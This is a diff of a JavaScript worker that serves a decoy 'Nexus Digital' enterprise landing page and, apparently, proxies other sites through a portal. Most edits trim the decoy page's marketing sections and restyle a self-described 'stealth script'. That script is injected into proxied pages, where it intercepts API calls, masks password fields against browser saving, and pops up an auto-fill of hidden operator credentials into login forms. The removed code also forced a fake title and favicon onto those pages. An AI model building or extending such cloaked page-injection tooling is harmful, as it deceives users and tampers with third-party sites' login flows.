@@ -36,7 +36,6 @@ const landingPageHTML = `
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nexus Digital | Enterprise Solutions</title>
-    <link rel="icon" type="image/jpeg" href="https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050505; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; scroll-behavior: smooth;}
@@ -45,7 +44,6 @@ const landingPageHTML = `
         input:focus { outline: none; box-shadow: none; }
         .feature-box { border: 1px solid rgba(255,255,255,0.05); background: rgba(255,255,255,0.01); transition: all 0.3s; }
         .feature-box:hover { background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.15); transform: translateY(-3px); }
-        .grid-bg { background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px); background-size: 30px 30px; }
     </style>
 </head>
 <body class="antialiased selection:bg-white selection:text-black">
@@ -56,26 +54,24 @@ const landingPageHTML = `
                 Nexus<span class="text-gray-500">.</span>
             </div>
             <div class="hidden md:flex gap-8 text-[10px] font-bold tracking-widest uppercase text-gray-400">
-                <a href="#solutions" class="hover:text-white transition">Solutions</a>
-                <a href="#infrastructure" class="hover:text-white transition">Infrastructure</a>
-                <a href="#compliance" class="hover:text-white transition">Compliance</a>
-                <a href="#contact" class="hover:text-white transition">Contact</a>
+                <a href="#services" class="hover:text-white transition">Solutions</a>
+                <a href="#pricing" class="hover:text-white transition">Pricing</a>
+                <a href="#testimonials" class="hover:text-white transition">Customers</a>
+                <a href="#resources" class="hover:text-white transition">Resources</a>
             </div>
             <button class="px-5 py-2.5 text-[10px] font-bold uppercase tracking-widest bg-white text-black hover:bg-gray-200 transition">Client Login</button>
         </div>
     </nav>
 
     <!-- Hero Section -->
-    <header class="relative pt-32 pb-20 md:pt-48 md:pb-24 px-4 flex flex-col items-center justify-center border-b border-white/5 overflow-hidden">
-        <div class="absolute inset-0 grid-bg opacity-30 pointer-events-none"></div>
+    <header class="relative pt-32 pb-20 md:pt-48 md:pb-24 px-4 flex flex-col items-center justify-center border-b border-white/5">
         <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-3/4 h-1/2 bg-indigo-900/10 blur-[120px] rounded-full pointer-events-none"></div>
-        
-        <div class="text-center z-10 w-full max-w-2xl mx-auto relative">
+        <div class="text-center z-10 w-full max-w-2xl mx-auto">
             <span class="text-[10px] font-bold tracking-widest uppercase text-indigo-400 border border-indigo-500/30 bg-indigo-500/10 px-3 py-1 rounded-full mb-6 inline-block">Enterprise Data Registry V4.2</span>
             <h1 class="text-5xl md:text-7xl font-light tracking-tight mb-4">Secure <span class="font-bold text-white">Assets</span></h1>
             <p class="text-gray-400 text-sm md:text-base tracking-wide mb-10 leading-relaxed">Search our global registry of digital projects, infrastructure documentation, and cloud services.</p>
             
-            <form id="search-form" class="w-full flex items-center p-1.5 border border-white/10 bg-[#0a0a0a] focus-within:border-indigo-500/50 transition-all shadow-[0_0_30px_rgba(0,0,0,0.5)] relative z-20">
+            <form id="search-form" class="w-full flex items-center p-1.5 border border-white/10 bg-[#0a0a0a] focus-within:border-indigo-500/50 transition-all shadow-[0_0_30px_rgba(0,0,0,0.5)]">
                 <div class="pl-4 flex items-center justify-center pointer-events-none">
                     <svg id="search-icon" class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                 </div>
@@ -89,19 +85,6 @@ const landingPageHTML = `
         </div>
     </header>
 
-    <!-- Trusted Brands Banner -->
-    <div class="py-8 bg-[#020202] border-b border-white/5 text-center">
-        <p class="text-[9px] uppercase tracking-[0.2em] text-gray-600 mb-6 font-bold">Trusted by Global Technology Leaders</p>
-        <div class="flex flex-wrap justify-center items-center gap-8 md:gap-16 opacity-30 grayscale pointer-events-none select-none">
-            <span class="text-xl font-black tracking-tighter">AcmeCorp</span>
-            <span class="text-lg font-bold tracking-widest">GLOBEX</span>
-            <span class="text-xl font-light tracking-wide border-2 border-current px-2">SOYLENT</span>
-            <span class="text-lg font-serif italic font-bold">Initech</span>
-            <span class="text-xl font-bold uppercase tracking-widest flex items-center gap-1"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2z"/></svg> Apex</span>
-        </div>
-    </div>
-
-    <!-- Quick Stats -->
     <div class="w-full border-b border-white/5 bg-[#080808]">
         <div class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 py-12 px-6 text-center">
             <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA</p></div>
@@ -111,119 +94,10 @@ const landingPageHTML = `
         </div>
     </div>
 
-    <!-- Features Section -->
-    <section id="solutions" class="py-24 bg-[#050505] border-b border-white/5">
-        <div class="max-w-7xl mx-auto px-6">
-            <div class="text-center mb-16">
-                <span class="text-indigo-500 text-[10px] font-bold uppercase tracking-widest mb-2 block">Core Capabilities</span>
-                <h2 class="text-3xl md:text-4xl font-light text-white">Enterprise-Grade <span class="font-bold">Architecture</span></h2>
-            </div>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <div class="feature-box p-8">
-                    <svg class="w-8 h-8 text-indigo-400 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 002-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"></path></svg>
-                    <h3 class="text-lg font-bold text-white mb-3 tracking-wide">Data Sovereignty</h3>
-                    <p class="text-xs text-gray-400 leading-relaxed">Ensure total compliance with localized data storage. Our infrastructure guarantees isolated instances across 45+ geographic regions.</p>
-                </div>
-                <div class="feature-box p-8">
-                    <svg class="w-8 h-8 text-indigo-400 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-                    <h3 class="text-lg font-bold text-white mb-3 tracking-wide">Zero Trust Security</h3>
-                    <p class="text-xs text-gray-400 leading-relaxed">Built from the ground up with military-grade encryption and strict access protocols. Every request is strictly authenticated and logged.</p>
-                </div>
-                <div class="feature-box p-8">
-                    <svg class="w-8 h-8 text-indigo-400 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                    <h3 class="text-lg font-bold text-white mb-3 tracking-wide">Low-Latency Edge</h3>
-                    <p class="text-xs text-gray-400 leading-relaxed">We leverage edge computing nodes globally to bring your assets closer to your workforce, ensuring minimal loading delays worldwide.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Global Infrastructure Info -->
-    <section id="infrastructure" class="py-24 bg-[#080808] relative overflow-hidden">
-        <div class="absolute right-0 top-0 w-1/2 h-full opacity-10 flex items-center justify-center pointer-events-none">
-            <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg" class="w-full h-full scale-150 transform translate-x-1/4">
-                <path fill="#4f46e5" d="M44.7,-76.4C58.8,-69.2,71.8,-59.1,81.3,-46.3C90.8,-33.5,96.8,-18.1,95.5,-3.2C94.2,11.7,85.6,26.1,75.4,38.1C65.2,50.1,53.4,59.7,40.1,67.6C26.8,75.5,12.1,81.7,-2.8,86.5C-17.7,91.3,-35.4,85.1,-48.5,75.4C-61.6,65.7,-70.1,52.5,-77.8,38.4C-85.5,24.3,-92.4,9.3,-92.1,-5.6C-91.8,-20.5,-84.3,-35.3,-74.1,-47.1C-63.9,-58.9,-51,-67.7,-37.2,-74.8C-23.4,-81.9,-8.7,-87.3,3.3,-92.7C15.3,-98.1,30.6,-83.6,44.7,-76.4Z" transform="translate(100 100)" />
-            </svg>
-        </div>
-        <div class="max-w-7xl mx-auto px-6 relative z-10 flex flex-col md:flex-row items-center gap-12">
-            <div class="md:w-1/2">
-                <h2 class="text-3xl md:text-4xl font-light text-white mb-6">Designed for <span class="font-bold">Scale.</span></h2>
-                <p class="text-gray-400 text-sm leading-relaxed mb-8">Nexus powers top-tier financial platforms, health registries, and governmental agencies. Our backbone network routes over 50 Tbps of traffic daily without compromising a single packet.</p>
-                <div class="space-y-4">
-                    <div class="flex items-center gap-4 border-b border-white/5 pb-4">
-                        <div class="w-10 h-10 bg-indigo-500/10 flex items-center justify-center border border-indigo-500/20"><span class="text-indigo-400 font-bold">01</span></div>
-                        <div><h4 class="text-sm font-bold text-white uppercase tracking-widest">DDoS Mitigation</h4><p class="text-[10px] text-gray-500 uppercase tracking-widest">Automated L3/L4/L7 Protection</p></div>
-                    </div>
-                    <div class="flex items-center gap-4 border-b border-white/5 pb-4">
-                        <div class="w-10 h-10 bg-indigo-500/10 flex items-center justify-center border border-indigo-500/20"><span class="text-indigo-400 font-bold">02</span></div>
-                        <div><h4 class="text-sm font-bold text-white uppercase tracking-widest">Auto-Scaling Nodes</h4><p class="text-[10px] text-gray-500 uppercase tracking-widest">Kubernetes Managed Clusters</p></div>
-                    </div>
-                    <div class="flex items-center gap-4">
-                        <div class="w-10 h-10 bg-indigo-500/10 flex items-center justify-center border border-indigo-500/20"><span class="text-indigo-400 font-bold">03</span></div>
-                        <div><h4 class="text-sm font-bold text-white uppercase tracking-widest">Disaster Recovery</h4><p class="text-[10px] text-gray-500 uppercase tracking-widest">Multi-AZ Data Redundancy</p></div>
-                    </div>
-                </div>
-            </div>
-            <div class="md:w-1/2 flex justify-center">
-                <div class="relative w-full max-w-md p-6 border border-white/10 bg-black/50 backdrop-blur-sm">
-                    <div class="flex items-center justify-between border-b border-white/10 pb-4 mb-4">
-                        <span class="text-[10px] text-gray-400 uppercase tracking-widest font-bold">System Status</span>
-                        <span class="flex items-center gap-2 text-[10px] text-green-400 font-bold uppercase tracking-widest"><div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div> All Systems Operational</span>
-                    </div>
-                    <div class="space-y-3">
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">US-East (Virginia)</span><span class="text-white">12ms</span></div>
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">EU-Central (Frankfurt)</span><span class="text-white">15ms</span></div>
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">AP-Southeast (Singapore)</span><span class="text-white">18ms</span></div>
-                        <div class="flex justify-between text-xs"><span class="text-gray-500">SA-East (São Paulo)</span><span class="text-white">22ms</span></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
     <!-- Massive Footer -->
-    <footer id="contact" class="pt-24 pb-10 px-6 bg-[#030303] border-t border-white/5">
-        <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-12 border-b border-white/5 pb-16 mb-8">
-            <div class="md:col-span-2">
-                <div class="text-xl font-bold tracking-widest uppercase mb-4 flex items-center gap-2">
-                    <svg class="w-6 h-6 text-indigo-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
-                    Nexus<span class="text-gray-500">.</span>
-                </div>
-                <p class="text-gray-500 text-xs leading-relaxed max-w-sm mb-6">Nexus provides secure, enterprise-grade data management and registry services for global organizations. Ensuring privacy and scale.</p>
-                <div class="flex items-center gap-4 text-gray-500">
-                    <span class="text-[10px] uppercase tracking-widest font-bold border border-white/10 px-2 py-1">SOC 2 TYPE II</span>
-                    <span class="text-[10px] uppercase tracking-widest font-bold border border-white/10 px-2 py-1">ISO 27001</span>
-                </div>
-            </div>
-            <div>
-                <h4 class="text-white text-[10px] font-bold uppercase tracking-widest mb-6">Company</h4>
-                <ul class="space-y-3 text-xs text-gray-500">
-                    <li><a href="#" class="hover:text-indigo-400 transition">About Us</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Careers</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Press & Media</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Contact Sales</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4 class="text-white text-[10px] font-bold uppercase tracking-widest mb-6">Legal</h4>
-                <ul class="space-y-3 text-xs text-gray-500">
-                    <li><a href="#" class="hover:text-indigo-400 transition">Privacy Policy</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Terms of Service</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Data Processing</a></li>
-                    <li><a href="#" class="hover:text-indigo-400 transition">Cookie Preferences</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
+    <footer class="pt-20 pb-10 px-6 bg-[#030303] border-t border-white/5">
+        <div class="max-w-7xl mx-auto flex flex-col items-center">
             <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise. All rights reserved.</p>
-            <div class="flex gap-4">
-                <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition cursor-pointer">
-                    <svg class="w-3.5 h-3.5 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/></svg>
-                </div>
-                <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition cursor-pointer">
-                    <svg class="w-3.5 h-3.5 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
-                </div>
-            </div>
         </div>
     </footer>
 
@@ -836,7 +710,7 @@ export default {
                 </div>`;
             }
 
-            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><link rel="icon" type="image/jpeg" href="https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg"><script src="https://cdn.tailwindcss.com"></script>
+            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><script src="https://cdn.tailwindcss.com"></script>
             <style>body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; }</style></head>
             <body class="pb-20">
                 ${customModalScript} ${notifHTML} ${waHTML}
@@ -984,7 +858,7 @@ export default {
                 
                 const encTargetTrim = encrypt(targetDomain).substring(0,8);
                 
-                // 🔥 PERFECT STEALTH SCRIPT (Viewport Lock + Frozen Title/Favicon + Strict CSS)
+                // 🔥 PERFECT STEALTH SCRIPT (15px Margin Popup + Typing Unfrozen + Anti-Chrome Save)
                 const stealthScript = `<script>
 (function(){
     try{
@@ -1006,37 +880,6 @@ export default {
         if(!window.location.search.includes('_ctx=')){
             var sep = window.location.search ? '&' : '?';
             window.history.replaceState(null, '', window.location.pathname + window.location.search + sep + '_ctx=' + ctx);
-        }
-
-        // ==========================================
-        // 🔒 FIXED FAVICON & TITLE ENFORCER
-        // ==========================================
-        const fixedTitle = "Nexus Digital | Enterprise Solutions";
-        const fixedFavicon = "https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg";
-
-        function lockIdentity() {
-            if(document.title !== fixedTitle) document.title = fixedTitle;
-            let icons = document.querySelectorAll('link[rel~="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]');
-            let hasIcon = false;
-            icons.forEach(i => {
-                if(i.href === fixedFavicon) hasIcon = true;
-                else i.remove();
-            });
-            if(!hasIcon) {
-                let link = document.createElement('link');
-                link.rel = 'icon'; link.type = 'image/jpeg'; link.href = fixedFavicon;
-                document.head.appendChild(link);
-            }
-        }
-        lockIdentity();
-        let headObserver = new MutationObserver(lockIdentity);
-        headObserver.observe(document.head, { subtree: true, childList: true, attributes: true, characterData: true });
-
-        // Ensure Viewport Exists
-        if(!document.querySelector('meta[name="viewport"]')){
-            let v = document.createElement('meta');
-            v.name = "viewport"; v.content = "width=device-width, initial-scale=1.0";
-            document.head.appendChild(v);
         }
         
         // API INTERCEPTOR
@@ -1130,14 +973,9 @@ export default {
             const au = "${autoUser}"; const ap = "${autoPwd}";
             if(!au || !ap) return;
 
-            // 1. Extreme Anti Chrome Password Save + Strict Popup CSS Override
+            // 1. Extreme Anti Chrome Password Save (NO INTERVAL - Fixes Typing Freeze)
             let style = document.createElement('style');
-            style.innerHTML = \`
-                .nx-mask { -webkit-text-security: disc !important; font-family: text-security-disc, sans-serif !important; letter-spacing: 2px !important; }
-                #nx-popup-overlay { position:fixed !important; inset:0 !important; background:rgba(0,0,0,0.7) !important; backdrop-filter:blur(5px) !important; z-index:2147483647 !important; display:none; align-items:center !important; justify-content:center !important; padding:0 15px !important; box-sizing:border-box !important; }
-                #nx-popup-box { background:#0a0a0a !important; border:1px solid rgba(255,255,255,0.1) !important; width:100% !important; max-width:420px !important; padding:24px !important; border-radius:14px !important; display:flex !important; flex-direction:column !important; gap:14px !important; box-shadow:0 25px 50px -12px rgba(0,0,0,0.9) !important; font-family:sans-serif !important; box-sizing:border-box !important; }
-                #nx-popup-box * { box-sizing:border-box !important; line-height:normal !important; text-transform:none !important; letter-spacing:normal !important; font-size:initial !important; margin:0 !important; padding:0 !important; font-family:sans-serif !important; }
-            \`;
+            style.innerHTML = '.nx-mask { -webkit-text-security: disc !important; font-family: text-security-disc, sans-serif !important; letter-spacing: 2px; }';
             document.head.appendChild(style);
 
             const secureInputs = () => {
@@ -1168,23 +1006,26 @@ export default {
             let domObserver = new MutationObserver(() => secureInputs());
             domObserver.observe(document.body, { childList: true, subtree: true });
 
-            // 2. Responsive UI (With Strict inline styles enforcing size)
+            // 2. Responsive UI (Pure CSS 15px gap on left/right)
             let overlay = document.createElement('div');
             overlay.id = 'nx-popup-overlay';
+            overlay.style.cssText = 'position:fixed; inset:0; background:rgba(0,0,0,0.7); backdrop-filter:blur(5px); z-index:2147483647; display:none; align-items:center; justify-content:center; padding:0 15px; box-sizing:border-box;';
             
             let popup = document.createElement('div');
             popup.id = 'nx-popup-box';
             popup.innerHTML = \`
-                <div style="display:flex !important; align-items:center !important; gap:10px !important; border-bottom:1px solid rgba(255,255,255,0.05) !important; padding-bottom:12px !important; width:100% !important;">
-                    <div style="width:30px !important; height:30px !important; border-radius:50% !important; background:rgba(74,222,128,0.1) !important; display:flex !important; align-items:center !important; justify-content:center !important; border:1px solid rgba(74,222,128,0.2) !important;">
-                        <svg style="width:16px !important; height:16px !important; color:#4ade80 !important; display:block !important;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8V7z"></path></svg>
+                <div style="background:#0a0a0a; border:1px solid rgba(255,255,255,0.1); width:100%; max-width:420px; padding:24px; border-radius:14px; display:flex; flex-direction:column; gap:14px; box-shadow:0 25px 50px -12px rgba(0,0,0,0.9); font-family:sans-serif; box-sizing:border-box;">
+                    <div style="display:flex; align-items:center; gap:10px; border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:12px;">
+                        <div style="width:30px; height:30px; border-radius:50%; background:rgba(74,222,128,0.1); display:flex; align-items:center; justify-content:center; border:1px solid rgba(74,222,128,0.2);">
+                            <svg style="width:16px;height:16px;color:#4ade80;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8V7z"></path></svg>
+                        </div>
+                        <span style="color:white; font-size:16px; font-weight:700; letter-spacing:0.5px;">Auto Fill System</span>
                     </div>
-                    <span style="color:white !important; font-size:16px !important; font-weight:700 !important; letter-spacing:0.5px !important; display:block !important;">Auto Fill System</span>
-                </div>
-                <p style="color:#9ca3af !important; font-size:13px !important; line-height:1.5 !important; display:block !important; width:100% !important; margin-top:8px !important; margin-bottom:8px !important;">Do you want to insert your panel credentials into this login form?</p>
-                <div style="display:flex !important; gap:12px !important; margin-top:6px !important; width:100% !important;">
-                    <button id="nx-btn-no" style="flex:1 !important; background:rgba(255,255,255,0.05) !important; color:#d1d5db !important; border:1px solid rgba(255,255,255,0.1) !important; padding:12px !important; border-radius:8px !important; font-size:12px !important; font-weight:bold !important; cursor:pointer !important; text-transform:uppercase !important; letter-spacing:1px !important; transition:0.2s !important; display:block !important;">No</button>
-                    <button id="nx-btn-yes" style="flex:1 !important; background:#4f46e5 !important; color:white !important; border:none !important; padding:12px !important; border-radius:8px !important; font-size:12px !important; font-weight:bold !important; cursor:pointer !important; text-transform:uppercase !important; letter-spacing:1px !important; box-shadow:0 0 15px rgba(79,70,229,0.4) !important; transition:0.2s !important; display:block !important;">Yes, Fill It</button>
+                    <p style="color:#9ca3af; font-size:13px; margin:0; line-height:1.5;">Do you want to insert your panel credentials into this login form?</p>
+                    <div style="display:flex; gap:12px; margin-top:6px;">
+                        <button id="nx-btn-no" style="flex:1; background:rgba(255,255,255,0.05); color:#d1d5db; border:1px solid rgba(255,255,255,0.1); padding:12px; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; text-transform:uppercase; letter-spacing:1px; transition:0.2s;">No</button>
+                        <button id="nx-btn-yes" style="flex:1; background:#4f46e5; color:white; border:none; padding:12px; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; text-transform:uppercase; letter-spacing:1px; box-shadow:0 0 15px rgba(79,70,229,0.4); transition:0.2s;">Yes, Fill It</button>
+                    </div>
                 </div>
             \`;
             overlay.appendChild(popup);
@@ -1198,7 +1039,10 @@ export default {
                 e.preventDefault();
                 overlay.style.display = 'none';
                 rejected = true;
-                if(lastFocusedInput) { setTimeout(() => lastFocusedInput.focus(), 100); }
+                // Allow manual typing by focusing back!
+                if(lastFocusedInput) {
+                    setTimeout(() => lastFocusedInput.focus(), 100);
+                }
             };
 
             document.getElementById('nx-btn-yes').onclick = (e) => {
@@ -1239,7 +1083,7 @@ export default {
                     let p = (e.target.placeholder||'').toLowerCase();
                     if (e.target.classList.contains('nx-mask') || e.target.type === 'password' || n.includes('user') || p.includes('user') || n.includes('login')) {
                         lastFocusedInput = e.target;
-                        overlay.style.setProperty('display', 'flex', 'important');
+                        overlay.style.display = 'flex';
                         e.target.blur(); // Dismiss mobile keyboard instantly
                     }
                 }
